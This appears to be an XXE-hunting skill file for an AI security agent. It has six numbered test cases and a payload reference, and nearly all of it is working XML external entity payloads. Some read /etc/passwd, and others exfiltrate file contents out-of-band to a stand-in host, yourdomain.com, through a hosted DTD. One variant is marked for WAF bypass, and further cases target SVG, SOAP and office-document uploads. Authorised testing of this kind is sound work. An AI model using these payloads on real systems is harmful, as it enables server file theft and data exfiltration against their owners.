# XXE Hunting Skill — 6 Test Cases

> Load when: XXE, XML external entity, XML injection, out-of-band data exfiltration.

## 120. Basic XXE file read (easy)
Send `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>` in XML body. Report if `/etc/passwd` is returned.

## 121. Blind XXE via error messages (medium)
Send `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///nonexistent">]><foo>&xxe;</foo>`. Report if error message reveals internal path.

## 122. Blind XXE via OOB exfiltration (hard)
Send `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://yourdomain.com/?data=FILE">]><foo>&xxe;</foo>` where FILE is `/etc/passwd`. Check DNS/HTTP logs.

## 123. XXE in SVG upload (medium)
Upload SVG with `<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><svg>&xxe;</svg>`. Check if rasterizer processes entities.

## 124. XXE in SOAP endpoints (easy)
Send XXE payload in SOAP XML body. SOAP is often vulnerable because XML parsing is enabled.

## 125. XXE in DOCX/XLSX import (medium)
Craft DOCX or XLSX with embedded XXE. Upload to import functionality. Report if entities are processed.

---

## XXE Payload Reference
```xml
<!-- Basic file read -->
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<foo>&xxe;</foo>

<!-- Blind OOB -->
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://yourdomain.com/?data=FILE">]>
<foo>&xxe;</foo>

<!-- Parameter entity (for WAF bypass) -->
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://yourdomain.com/xxe.dtd">%xxe;]>

<!-- XXE DTD (hosted externally) -->
<!ENTITY % data SYSTEM "file:///etc/passwd">
<!ENTITY % param "<!ENTITY exfil SYSTEM 'http://yourdomain.com/?d=%data;'>">
%param;
%exfil;
```

## Exfiltration Methods
| Method | Use Case |
|--------|----------|
| In-band | Data returned in response |
| OOB via HTTP | Data sent to attacker URL |
| OOB via DNS | Data sent via DNS subdomain |
| Error-based | Data in error messages |
| Blind via timing | Data inferred by response time |
